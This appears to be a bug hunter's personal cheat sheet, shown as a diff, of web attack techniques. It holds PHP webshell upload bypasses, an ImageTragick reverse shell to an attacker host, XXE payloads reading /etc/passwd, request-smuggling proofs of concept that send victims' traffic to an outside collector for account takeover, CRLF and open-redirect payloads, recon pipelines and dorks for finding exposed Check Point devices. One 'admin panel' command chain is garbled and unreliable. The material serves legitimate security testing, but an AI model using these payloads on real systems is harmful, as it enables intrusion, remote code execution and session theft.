-— PLAYBOOK SCAN: 
-Try to manipulate all the contents of the token to scan for common JWT vulnerabilities.
-you can automate your test by this command:
-
-#jwt_tool -t http://example.com -rh “Authorization: Bearer <JWT_Token>” -M pb
-
-6. Null kid
-Investigate the presence of a null “kid” (key ID) value.
-
-- Key-Confusion attack:
-   #jwt_tool <JWT_Token> -X k -pk < public-key-pem >
-   
-   
-   TOKEN REPLAY ATTACKS: 
-   reuse the old token or use the token after logout or after changing the password or e-mail, because if the JWT token is not invalidated or refreshed the attacker may be able to use the token to continue to access the system as the logged-in user.
-
-
-The top 3 popular tools recommended 😎 ->
-1. The JSON Web Token Toolkit 
-Create tokens, find problems, and boost bounty rewards with an easy command-line tool. It's perfect for spotting weaknesses in how JWTs are used.
-https://github.com/ticarpi/jwt_tool
-
-2. JWT Editor extension 
-With JWT Editor extension you can seamlessly edit and analyze JWTs within your browser, simplifying debugging.
-https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd
-
-3. jwtXploiter 
-A tool to test security of JSON Web Tokens. It is written in python and you automate JWT testing against all known CVEs.
-https://github.com/DontPanicO/jwtXploiter
-
-
-     Dns  takeover       dns takeover   dns takeover 
-     Detection of DNS takeovers
-The exact way to check if a domain is vulnerable varies a bit depending on which service it is pointing to - but generally, there are two criteria:
-
-The domain returns a SERVFAIL (or sometimes REFUSED) when you try to resolve it
-The authoritative nameservers for that domain belong to one of the vulnerable services in the list above
-     
-      dig tesla.com +trace
-       dnstrace -nsonly A google.com
-
-      
-      
-      
-      
-      FILE UPLOAD CHEATSHEET           FILE UPLOAD CHEATSHEET          FILE UPLOAD CHEATSHEET    
-      
-      if you got a file upload, try every possible way to escalate it further. Upload almost everything and see if application allows you to upload something like a script. Change extensions, add an extra extension, these things will surely help you to learn a lot of things. Also, always keep an eye on URLS with every passing endpoint. Default parameters are super helpful in escalating SSRFs.
-      
-       
-Where to find
-In upload file feature, for example upload photo profile feature
-How to exploit
-read also this pdf it contains a many of ideas
-1-https://github.com/Az0x7/vulnerability-Checklist/blob/main/File%20Upload/File-Upload.pdf
-by 0xAwali
-2-https://github.com/Az0x7/vulnerability-Checklist/blob/main/File%20Upload/Slides(1).pdf by ebrahim
-hegazy
-1. Change the Content-Type value
-POST /images/upload/ HTTP/1.1
-Host: target.com
-...
----------------------------829348923824
-Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
-Content-Type: application/x-php
-Change the Content-Type
-POST /images/upload/ HTTP/1.1
-Host: target.com
-...
----------------------------829348923824
-Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
-Content-Type: image/jpeg
-2. Try to change the extension when send the request, for example in here you cant upload file with ext
-php but you can upload jpg file
-POST /images/upload/ HTTP/1.1
-Host: target.com
-...
----------------------------829348923824
-Content-Disposition: form-data; name="uploaded"; filename="dapos.php.jpg"
-Content-Type: application/x-php
-Change the request to this
-POST /images/upload/ HTTP/1.1
-Host: target.com
-...
----------------------------829348923824
-
-
-Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
-Content-Type: application/x-php
-3. Upload the payload, but start with GIF89a; and
-POST /images/upload/ HTTP/1.1
-Host: target.com
-...
----------------------------829348923824
-Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
-Content-Type: image/gif
-GIF89a; <?php system("id") ?>
-And dont forget to change the content-type to image/gif
-
-4. Bypass content length validation, it can be bypassed using small payload
-(<?=`$_GET[x]`?>)
-5. Using null byte in filename
-file.php%00.gif
-6. Using double extensions for the uploaded file
-file.jpg.php
-7. Uploading an unpopular php extensions (php4,php5,php6,phtml)
-file.php5
-8. Try to randomly capitalizes the file extension
-file.pHP5
-9. Mix the tips!
-Upload Function
-Extensions Impact
-ASP , ASPX , PHP5 , PHP , PHP3 : Webshell, RCE
-SVG : Stored XSS, SSRF, XXE
-GIF : Stored XSS, SSRF
-CSV : CSV injection
-XML : XXE
-AVI : LFI, SSRF
-HTML , JS : HTML injection, XSS, Open redirect
-PNG , JPEG : Pixel flood attack (DoS)
-
-ZIP : RCE via LFI, DoS
-PDF , PPTX : SSRF, BLIND XXE
-Blacklisting Bypass
-PHP → .phtm , phtml , .phps , .pht , .php2 , .php3 , .php4 , .php5 , .shtml , .phar ,
-.pgif , .inc
-ASP → asp , .aspx , .cer , .asa
-Jsp → .jsp , .jspx , .jsw , .jsv , .jspf
-Coldfusion → .cfm , .cfml , .cfc , .dbm
-Using random capitalization → .pHp , .pHP5 , .PhAr
-Whitelisting Bypass
-file.jpg.php
-file.php.jpg
-file.php.blah123jpg
-file.php%00.jpg
-file.php\x00.jpg this can be done while uploading the file too, name it file.phpD.jpg
-and change the D (44) in hex to 00.
-file.php%00
-file.php%20
-file.php%0d%0a.jpg
-file.php.....
-file.php/
-file.php.\
-file.php#.png
-file.
-.html
-Vulnerabilities
-[ ] Directory Traversal
-Set filename ../../etc/passwd/logo.png
-Set filename ../../../logo.png as it might changed the website logo.
-[ ] SQL Injection
-Set filename 'sleep(10).jpg .
-Set filename sleep(10)-- -.jpg .
-[ ] Command Injection
-Set filename ; sleep 10;
-[ ] SSRF
-Abusing the "Upload from URL", if this image is going to be saved in some public site,
-you could also indicate a URL from IPlogger and steal information of every visitor.
-SSRF Through .svg file.
-
-<?xml version="1.0" encoding="UTF-8" standalone="no"?><svg xmlns:svg="http://www.w3.o
-[ ] ImageTragic
-push graphic-context
-viewbox 0 0 640 480
-fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0
-pop graphic-context
-[ ] XXE
-Upload using .svg file
-<?xml version="1.0" standalone="yes"?>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
-<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="htt
-<text font-size="40" x="0" y="16">&xxe;</text>
-</svg>
-<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" w
-<image xlink:href="expect://ls"></image>
-</svg>
-Using excel file
-[ ] XSS
-Set file name filename="svg onload=alert(document.domain)>" ,
-filename="58832_300x300.jpg<svg onload=confirm()>"
-Upload using .gif file
-GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
-Upload using .svg file
-<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
-<?xml version="1.0" standalone="no"?>
-<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DT
-<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
-<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb
-<script type="text/javascript">
-alert("HolyBugx XSS");
-</script>
-</svg>
-[ ] Open Redirect
-a. Upload using .svg file
-      <code>
-<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
-<svg
-onload="window.location='https://attacker.com'"
-xmlns="http://www.w3.org/2000/svg">
-<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0
-</svg>
-</code>
-Content-ish Bypass
-[ ] Content-type validation
-Upload file.php and change the Content-type: application/x-php or Content-Type
-: application/octet-stream to Content-type: image/png or Content-type: image/gif
-or Content-type: image/jpg .
-[ ] Content-Length validation
-Small PHP Shell
-(<?=`$_GET[x]`?>)
-[ ] Content Bypass Shell
-If they check the Content. Add the text "GIF89a;" before you shell-code. ( Contenttype: image/gif )
-GIF89a; <?php system($_GET['cmd']); ?>
-Misc
-[ ] Uploading file.js & file.config (web.config)
-[ ] Pixel flood attack using image
-[ ] DoS with a large values name: 1234...99.png
-[ ] Zip Slip
-If a site accepts .zip file, upload .php and compress it into .zip and upload it.
-Now visit, site.com/path?page=zip://path/file.zip%23rce.php
-[ ] Image Shell
-Exiftool is a great tool to view and manipulate exif-data. Then I will to rename the file
-mv pic.jpg pic.php.jpg
-exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' pic.jpg
-
- tips
- 1️⃣ Missed Extension: Finding missed extensions that can be executed on the server side or can be dangerous on the   client side.
-Example:  “.php5”, “.pht”, “.phtml”, “.shtml”, “.asa”, “.cer”, “.asax”, “.swf”, or “.xap”
-
- 2)Case Sensitive: Changing a number of letters to their capital forms to bypass case sensitive rules.
-Example: “file.aSp” or “file.PHp3”
-3️⃣ Control Characters: Using control characters such as null character (0x00) after a forbidden extension and before a permitted one may lead to a bypass. 
-Example: file.php%00.jpg
-Here .jpg gets truncated and .php becomes the new extension.
-4️⃣ Double Extension: Using 2 different extensions after the file name helps us to bypass the restriction.
-Example: file.php.jpg
-5️⃣ Line Termination Trick: Write each letter of the extension in a new line. 
-
-Example:
-
-file.
-p
-h
-p
-
-
-      
-    note 
-     when files  upload is only sensitive to the content-type, not the file extension. turned on intercept in Burp Suite and uploaded a PHP file, changing the content-type to image/png in that request  
-      
-      
-      check for gap tools in burp and x8 tool
-      gap to extract parameters of the same domain
-    
-    
-      
-    
-  TIP
-  ///ZSEANO TOOLKIT AND METHODOLOGY //      ///ZSEANO TOOLKIT AND METHODOLOGY //      ///ZSEANO TOOLKIT AND METHODOLOGY //
-    discovery subdomain and content 
-  amass: amass enum -brute-active -d domain.com -o amass-output.txt
-  
-  working http and https server
-  cat amass-output.txt | httprobe -p http:81 -p http:3000 -p http:3001 -p http:8000 -p http:8080 -p http:8443 -c 50 | tee online-domain.txt
-  
-  dnsgen for some gems
-  amass-output.txt | dnsgen - | httprobe
-  
-  vitual inspection
-  cat domains-endpoint.txt | aquatone
-  
-  to discover files and directories
-  ffuf -ac -v -u https://domain/FUZZ -w wordlist
-  
-  hacking scripts
-  github.com/tomnonnom
-  
-  
-  waybackurlmachine scanner:  this will scrape /robot.txt for all domain i provided  and scrape as many yeasr as possibele. from here i will simply scan each endpoint found via burpintruder or ffuf and determine which endpoint are stll alive 
-  tools: https://gist.github/mhmdiaa
-  also scrapp the home page of each subdomian found to check what used to be there  and also start scrapping for common end point 
-  
-  tools
-  paramscanner, linkfinder, parameth
-  
-  anychanges tool : this tools takes a list of urls and regular check for any changes on th pages. it looks for a new href and reference a new javascript filles 
-  
-  allows try to find new content ,parameters and functionality to look at, website changes every day and you will like to be the first to look out for it and also always take a peak into the website history to check for old files/ directory
-   
-   startng out 
-   allows look out for filters and try to bypass them..
-   
-       xss methodology
-       find out wht payload are allows and how th website reflect them..
-       check for doble encoding
-       check how website reflect incomplete tags    <iframe src=//smart.com/c=
-       
-       
-       check if <script> was reflected as &lt;script&gt;, but %26lt;script%26gt; was reflected as <script>,  If not matter what you try you always see &lt;script&gt; or %3Cscript%3E then the parameter in question may not be vulnerable.
-       
-       ssrf
-       always test how they handle redirect
-       looks for fixture with URL parameter, on a large bounty program, i will instantly try to find their api console (usually on their developer Docs page)
-       allows check for company that uses jira, company dont allows patch their cves
-       
-       
-       
-       
-       
-       # Passive Enumeration
-$ subfinder -d redacted.com -o subfinder.txt
-$ amass enum -d --passive redacted.com -o amass.txt
-$ echo redacted.com | assetfinder --subs-only | tee assetfinder.txt
-$ cat subfinder.txt amass.txt assetfinder.txt | sort -u | anew Psubdomains.txt
-
-# Active Enumeration
-$ puredns bruteforce subdomains-wordlist.txt redacted.com -r resolvers-wordlist.txt -w puredns.txt
-$ cat subdomains.txt | alterx | anew alterx.txt
-
-$ cat alterx.txt puredns.txt | sort -u | anew Asubdomains.txt
-
-# Sorting and Collecting active and passive subdomains
-$ cat Asubdomains.txt Psubdomains.txt | sort -u | anew subdomains.txt
-
-# Checking Alive Subdomains
-$ cat subdomains.txt | httpx -mc 200 | anew alive-subdomains.txt
-
-# Checking subdomains with httprobe
-$ cat subdomains.txt | httprobe | anew webs.txt
-
-# Enumerating the Status Code, Technology Stack and Title of each subdomain
-$ cat subdomains.txt | httpx -sc -title -td | anew httpx.txt
-
-each subdomain
-
-echo www.redacted.gap.com | httpx -sc -title -td -web-server
-
-ffuf -u https://notes.readcted.com/FUZZ -w ~/wordlists/domino.txt -mc 200 -fw 1
-
-  TIP
-  Always FUZZ based on the technology stack and always dig deep, say you found /admin — 403, then try fuzzing for https://example.com/admin/FUZZ URL to check if any other endpoint accessible without admin login
-       
-       
-       
-       https://yourtarget[.]com/auth/realms/master/clients-registrations/default/security-admin-console
-
-Scan your targets using the following command and ethically report any quick wins:
-
-nuclei -l targets.txt -t CVE-2020-27838.yaml
-
-Here's the link to the template - https://github.com/projectdiscovery/nuclei-templates/blob/4d6274fcd433d84a4ef7681cda6ad8e93a6448af/http/cves/2020/CVE-2020-27838.yaml#L2
-       
-           
-           
-           How to perform introspection in GraphQL
-           Send a POST request with the below body.
-           
-           {"query": "query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}
-
-    extract the JSON response in a file. once you have the schema, the best way is to import it into a tool like “GraphQL Voyager
-           
-           
-           HTTP REQUEST SMUGGLING      HTTP REQUEST SMUGGLING         HTTP REQUEST SMUGGLING
-           
-           methodology      https://medium.com/@rcxsecurity/http-request-smuggling-wwwwwh-85be9c46a38e
-    this occurs when the front end processes the Content-Length header, and the back end processes the Transfer-Encoding header
- 1)          CL.TE   
-       test case
- POST / HTTP/1.1
-Host: cyberseccafe.com
-Transfer-Encoding: chunked
-Content-Length: 4
-
-1
-F
-X        
- 
- this request will trigger a noticeable time delay in the response because it sends a chunked request with a hanging byte on the end if the vulnerability is present
- NOTE-- Tip: I’d recommend pasting this request in your BurpSuite and highlighting the body to understand where the Content-Length cuts off. Since the length is 4, it will leave the X hanging.
-
-We can send a basic request like the following to fully confirm the vulnerabiliTY
- 
- POST /search HTTP/1.1
-Host: cyberseccafe.com
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 50
-Transfer-Encoding: chunked
-
-ff
-q=smuggler&z=
-0
-
-GET /404 HTTP/1.1
-Foo: z
-
-
- So, if this vulnerability is present, sending a second request after the first will return a 404 error — confirming a CL.TE request smuggling vulnerability is present.
-           
-2)   TE.CL   
- The front end interprets the Transfer-Encoding header, and the back end uses the Content-Length   
- 
-POST / HTTP/1.1
-Host: cyberseccafe.com
-Transfer-Encoding: chunked
-Content-Length: 6
-
-0
-
-X
-
- If you send the same request again, it should attempt an XPOST method, appending the hanging chunk to the beginning of the following request.
-Once observed, you can send the following POC to confirm the found vulnerability:          
-     
-  POST /feature HTTP/1.1
-Host: cyberseccafe.com
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 4
-Transfer-Encoding: chunked
-
-8f
-GET /404 HTTP/1.1
-Host: cyberseccafe.com
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 130
-z=
-0      
-
-3) TE.TE
- The last example of a Request Smuggling attack is when both front end and back end support the Transfer-Encoding header. As an attacker, you can use obfuscation of the TE header to attempt to induce either the front end or back end to not process it. You can then smuggle in a second request like shown above.
- 
- 
- Transfer-Encoding: xchunked
-Transfer-Encoding : chunked
-Transfer-Encoding: chunked
-Transfer-Encoding: x
-Transfer-Encoding:[tab]chunked
-[space]Transfer-Encoding: chunked
-X: X[\n]Transfer-Encoding: chunked
-Transfer-Encoding
-: chunked
-
-
-           
-           
-           1.Using HTTP Request Smuggling Burp Extension either burp community or pro. you can widen your scope by adding more subdomains and URLs select them all and from the extension tab click smuggle probe.
-
-‌2. Using smuggler.py tool which is a command line tool that replicate almost the same work of burp extension.
-
-# Single Host:
-python3 smuggler.py -u <URL>
-
-# List of hosts:
-cat list_of_hosts.txt | python3 smuggler.py
-‌Note: These scanner will not guarantee the existing of vulnerability, there are false positives so you need to validate every finding of any of these tools. ‌
-    FINDINGS
-    
-    run burp extension scanner on all the subdomain   and check for the response
-    validate findings by sending some chunked data
-    POST / HTTP/1.1 
-Host: subdoamin.readcted.com
-Upgrade-Insecure-Requests: 1 
-Content-Type: application/x-www-form-urlencoded 
-Content-Length: 7 
-Transfer-Encoding: chunked 
-Transfer-encoding: identity
-
-
-1
-A
-0
-
-  To exploit HTTP Request Smuggling Vulnerability you have to use turbo intruder to be able to send concurrent request and to receive the smuggled one before it reach the user. we will send the following request:
-
-POST / HTTP/1.1
-Host: redacted.com
-Upgrade-Insecure-Requests: 1
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 32
-Transfer-Encoding: chunked
-Transfer-encoding: identity
-
-0
-
-GET /video HTTP/1.1
-Foo: x
-
-    Escalating to Full Account takeover
-Now let’s craft our request that will be smuggled to send our malicious one. I will request bin to receive users traffic into my endpoint. the payload shall looks like the following: ‌
-
-POST / HTTP/1.1
-Host: redacted.com
-Upgrade-Insecure-Requests: 1
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 91
-Transfer-Encoding: chunked
-Transfer-encoding: identity
-
-0
-
-GET /video HTTP/1.1
-Host: enfliy4kmrr8i.x.pipedream.net
-Foo: x
-    
-           
-           
-           dump two request at a time  change the http/2 tp http/1 , and focus on  the second request that no user agent is involved 
-            example 
-             GET /test?a=a% HTTP/1.1
-            Host: admin.target.com
-         User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
- 
-           GET /admin/login HTTP/1.1
-            Host: admin.target.com
-
-           
-          Host: admin.target.com
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
-
-GET /admin/login HTTP/1.1
-Host: admin.target.com Cache possioning       
-
-
-
-     tip  
-     For this particular HHI case, it is only exploitable by adding a letter /a as a GET parameter (I tried with other letters, and only this one worked -weird-), allowing the redirection of the domain *****.net to evil.com.
-   GET /a  http 1/1
-   host: eveil.com
-   
-   
-   verification 
-   Request
-   POST /  http1/1
-   host: victiom.com
-   transfer encoding : chunked
-   content-leghth : 51
-   6
-   DESYNC
-   0
-   
-     GET /a  http 1/1
-   host: eveil.com
-   
-    the above request gave out the responses
-    
-    while exploring the above request, run a noumber of request like the example below
-       POST /  http1/1
-   host: victiom.com
-   transfer encoding : chunked
-   content-leghth : 51
-   6
-   DESYNC
-   0
-   
-     GET /a  http 1/1
-   host: a: 11111111111
-   
-   11 characteres 1 = 65535
-   10 characteres 1 = 13767
-    
-    
-    tip tip
-    write a  dynamic header rewrite rule with a specific value: concat("-", "\x0d\x0aTransfer-Encoding: chunked")
-    In combination with a POST body that was carefully crafted to include elements like 0\r\n\r\nGET / HTTP/1.1\r\nHost: internal.example.com\r\n\r\n, I succeeded in making HTTP request smuggling appear remarkably straightforward.
-   
-   
-      
-
-
-
-
-
-                                                   
-                                                   Web Cache deception       Web Cache deception
-           we manage to force the Load Balancer into caching our request on a specific crafted path of ours, we will be able to read our victim's sensitive data from the cached response.It wasn't straight-forward in this case
-           
-  NOTE  :     Relaxed cache rules can be very dangerous, especially with URL parser confusions.  In a website that uses caching, the request must go through the CDN before it gets the the web server. This means that the URL gets parsed twice, which makes it possible for a URL parser confusion
-           
-  allows check for this endpoint share/%2F..%2Fapi/auth/session?cachebuster=123   
-           
-   ****
-   first thing is to try is to fetch the resource with a file extension appended to the endpoint 
-   example
-   api/auth/session/test.css
-   /api/auth/session.css
-   /notifications/logo.png 
-   /stylesheet.css 
-   
-   Conditions
-So basically, two conditions are required for this vulnerability to exist:
-Web cache functionality is set for the web application to cache files by their extensions, disregarding any caching header.
-When accessing a page like http://www.example.com/home.php/non-existent.css, the web server will return the content of "home.php" for that URL.
-   
-      Mitigation
-Configure the cache mechanism to cache files only if their HTTP caching headers allow. That will solve the root cause of this issue.
-If the cache component provides the option, configure it to cache files by their content type.
-Configure the web server so that for pages such as http://www.example.com/home.php/non-existent.css, the web server doesn’t return the content of "home.php" with this URL. Instead, for example, the server should respond with a 404 or 302 response.
-
-
-   tip
-   Guess everything using Param Miner extension.
-   check for unkeyed header in the request  of param miner
-    added the `X-Forwarded-Host: example.com`  in burp repeter , host header in the first request and checked the response.
-   the original host will be over written with example.com
-   open the url in the private browser and check if The example.com was still showing in the response  and then excalte to xss or html injection
-   
-   below is the html injection
-   GET /blog?abcde=234 HTTP/2
-Host: www.test.com
-User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
-X-Forwarded-Host: test.com"><h1>themarkib0x0
-Accept-Encoding: gzip, deflate, br
-Content-Length: 2
-           
-           
-           
-           tip tip           https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9
-                              https://infosecwriteups.com/a-web-cache-deception-chained-to-a-csrf-the-recipe-9e9a5b5f53aa
-                              https://medium.com/@hbenja47/my-first-two-valid-and-rewarded-web-cache-deceptions-earning-2250-c8d2a6968713
-                              
-           If the application does not have a login functionality, but using Akamai CDN, these are my steps: Send the first request to Repeater
-           Check if the server is caching normal requests (you can tell this by the response header “Server-Timing: cdn-cache; desc=HIT”)
-           Add an Illegal Request Header into the request
-           
-           Request:
-GET /products/xxx/xxxx/xxx/?test HTTP/2
-Host: www.host.com
-\: 
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Upgrade-Insecure-Requests: 1
-Te: trailers
-
-    response
-HTTP/2 400 Bad Request
-Content-Type: text/html;charset=iso-8859-1
-Content-Length: 70
-Cache-Control: max-age=297
-Expires: Thu, 21 Jul 2022 16:17:54 GMT
-Date: Thu, 21 Jul 2022 16:12:57 GMT
-Server-Timing: cdn-cache; desc=HIT
-Server-Timing: edge; dur=32
-Server-Timing: origin; dur=147
-Strict-Transport-Security: max-age=86400
-Ak-Uuid: 0.bc85d817.1658419977.1592c61
-     ****   ***
-     If the Application does have a Login Functionality
-           Create an account Check if any sensitive information is disclosed in any page (e.g Session Token   
-           Send the request to Repeater Add a Cacheable Extension (.js , .css) at the end of the URL and see if it gives a 200 OK Response        
-           
-
-           
-           
-           
-           
-           Web Cache poisoning     Web Cache poisoning       Web Cache poisoning 
-           
-           
-           
-           check this 
-           https://medium.com/@hbenja47/how-do-i-search-for-web-cache-deception-6c5f318016ca
-           
-           
-           
-       
-
-     5MIN ADMIN PANEL ACCESSED PAYLOAD
-cat urls.txt | qsreplace "?admin=true" | gau | phpgcc | anew | kxss | awk  -v  -q txt | sed 's/http/\nhttp/g' | grep ^http | sed 's/\(^http[^ <]*\)\(.*\)/\1/g' | grep -vi -e dalfox -e lElLxtainw| sort -u | waybackurls
-
-
-
-   OPEN REDIRECT      OPEN REDIRECT      0PEN REDIRECT
-   few things i do when i get an open 
-   (1) i spray that parameter to other endpoint of the web application.
-(2) I always look into wayback machine for old urls to see if it have same or similar parameter.
-(3) Google dorks to see if i can get the same parameter in another endpoint.
-
-  tip tip  tip  tip
-  First if the Applictaion have a user sign-In/Sign-Up feature,then register a user and log in as the user.
-
-Go to your user profile page, for example: testvuln.com/accounts/profile
-2. Copy the profile page's URL
-
-3. Logout and Clear all the cookies and go to the homepage of the site.
-
-4. Paste the Copied Profile URL on the address bar
-
-5. If the site prompts for a login,check the address bar,you may find the login page with a redirect parameter like the following:
-
-https://testvuln.com/login?next=/accounts/profile
-
-https://testvuln.com/login?returnUrl=/accounts/profile
-
-2. How To Bypass
-Use `@`
-https://testvuln.com/login?next=https://vuln.me@evit.com
-
-- due to bad regex
-
-Use url encoded
-https://testvuln.com/login?next=http://evil%E3%80%82com
-
-- By using the character.(%E3%80%82 url encoded)instead of a normal dot in urls,it is possible to bypass the blocking.
-
-3. Try to leverage it to Xss
-https://testvuln.com/login?next=javascript:alert(1);//
-   
-   
    
     𝗖𝗥𝗟𝗙    𝗖𝗥𝗟𝗙  𝗖𝗥𝗟𝗙       𝗖𝗥𝗟𝗙       𝗖𝗥𝗟𝗙           𝗖𝗥𝗟𝗙                         𝗖𝗥𝗟𝗙                            𝗖𝗥𝗟𝗙
-   𝗖𝗥𝗟𝗙 𝗜𝗻𝗷𝗲𝗰𝘁𝗶𝗼𝗻 𝗕𝘆𝗽𝗮𝘀𝘀 𝘂𝘀𝗶𝗻𝗴 𝗚𝗕𝗞 𝗘𝗻𝗰𝗼𝗱𝗶𝗻𝗴
 
+
+  # CR/LF (Carriage Return/Line Feed) Injection     
+https://medium.com/cyberverse/crlf-injection-playbook-472c67f1cb46
+https://www.praetorian.com/blog/using-crlf-injection-to-bypass-akamai-web-app-firewall/
+
+CR/LF (Carriage Return/Line Feed) injection is a type of security vulnerability. CR/LF refers to a sequence of two ASCII control characters: Carriage Return (CR, ASCII code 13) and Line Feed (LF, ASCII code 10). These characters are used in text files to signify the end of a line and control the positioning of the cursor or print head when displaying or printing text. CR/LF injection vulnerabilities occur when attackers insert CR/LF characters into input fields, file extensions or file uploads to manipulate application behavior. This can lead to exploits such as altering headers, injecting malicious code, or manipulating file content.
+                 
+                 
+## Here are some tips for finding CRLF (Carriage Return Line Feed) vulnerability:
+
+1️⃣: Look for places where user input is reflected in the HTTP response header. CRLF vulnerabilities often arise when user input is injected into the header without being properly sanitized.
+
+2️⃣: Try injecting CRLF characters into user input fields to see if they are reflected in the header. For example, you might try inputting a string like "foo%0D%0Abar" into a search field and see if "foo" and "bar" appear as separate lines in the header.
+
+3️⃣: Use a tool like Burp Suite to intercept and modify HTTP requests. This can make it easier to inject CRLF characters and analyze the resulting header.
+
+4️⃣: Pay attention to the content of the header and how it changes based on your input. Look for patterns or anomalies that might indicate a CRLF vulnerability.
+
+5️⃣: Keep in mind that CRLF vulnerabilities can be used to perform a variety of attacks, including HTTP response splitting, header injection, and cache poisoning.  
+ 
+If you suspect that a CRLF vulnerability is present, be sure to thoroughly test and understand its potential impact.
+                 
+     ## crlf to path travesly   
+#https://infosecwriteups.com/understanding-crlf-injection-7b042fd5fb22
+http://vulnerable-website.com//www.google.com/%2f%2e%2e%0d%0aheader:header>
+ 
+#TIP
+  𝗖𝗥𝗟𝗙 𝗜𝗻𝗷𝗲𝗰𝘁𝗶𝗼𝗻 𝗕𝘆𝗽𝗮𝘀𝘀 𝘂𝘀𝗶𝗻𝗴 𝗚𝗕𝗞 𝗘𝗻𝗰𝗼𝗱𝗶𝗻𝗴
 GET /Cybertix    ==>  404 Not Found
-
 GET /%0D%0A%20Set-Cookie:cybertix=1  ==> 400 Bad Request
-
 GET /%E5%98%8D%E5%98%8Set-Cookie:cybertix-1 ==> 𝟮𝟬𝟬 𝗢𝗞
+
+
+   
+      tip
+   CRLF Injection
+
+
+Where to find
+It can be found anywhere, always check the request and response. Try to search for parameters that lead to redirects, you can see the response is (301, 302, 303, 307, 308).
+
+How to exploit
+Basic payload
+https://example.com/?lang=en%0D%0ALocation:%20https://evil.com/
+The response is
+
+HTTP/1.1 200 OK
+Content-Type: text/html
+Date: Mon, 09 May 2016 14:47:29 GMT
+Set-Cookie: language=en
+Location: https://evil.com/
+Double encode
+https://example.com/?lang=en%250D%250ALocation:%20https://evil.com/
+Bypass unicode
+https://example.com/?lang=en%E5%98%8A%E5%98%8DLocation:%20https://evil.com/
+
+
+
+
+
+
+
+
+
+XXE/ XML VULNERABILITIES                          XXE/ XML VULNERABILITIES                             XXE/ XML VULNERABILITIES
+
+
+
+
+https://blog.detectify.com/best-practices/how-we-got-read-access-on-googles-production-servers/
+
+
+Simple template 
+
+
+<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" > ] > <foo>&xxe;</foo> See if it's possible to add
+
+
+The following is a basic test:
+<!--?xml version="1.0" ?--> <!DOCTYPE replace [<!ENTITY example "Doe"> ]>  <userInfo>   <firstName>Juan</firstName>   <lastName>&example;</lastName>  </userInfo> The following is a classic XXE:
+<?xml version="1.0"?> <!DOCTYPE data [ <!ELEMENT data (#ANY)> <!ENTITY file SYSTEM "file:///etc/passwd"> ]> <data>&file;</data> <?xml version="1.0" encoding="ISO-8859-1"?>   <!DOCTYPE foo [   <!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo> <?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [   <!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo> This is classic XXE Base64 encoded:
+<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init;
+]><foo/>
+
+
+
+
+https:/​/​www.​davidsopas.
+com/​wikiloc-​xxe-​vulnerability/
+
+
+
+
+
+      CVES      CVES     CVES      CVES 
+      Xss and nuclei template for it.
+
+ CVE-2019-14974 , link for template 
+github.com/conan-sudo/CVE…
+
+How to use
+Find so many subdomains and run the nuclei templates
+https://twitter.com/hasansheet/status/1798752531205812373?t=Gjeo0ly2steQVUo1TrI6ew&s=19 
+
+
+
+cve-2024-24919                             https://medium.com/@jeetpal2007/how-to-exploit-cve-2024-24919-path-traversal-5493c50d2581
+Hunter: /product.name=”Check Point SSL Network Extender”
+FOFA: title=”Check Point SSL Network Extender” 
+SHODAN: http.title=”Check Point SSL Network Extender”
+
+
+
+
+CVE-2024-34470 on 
+@fofabot
+ 
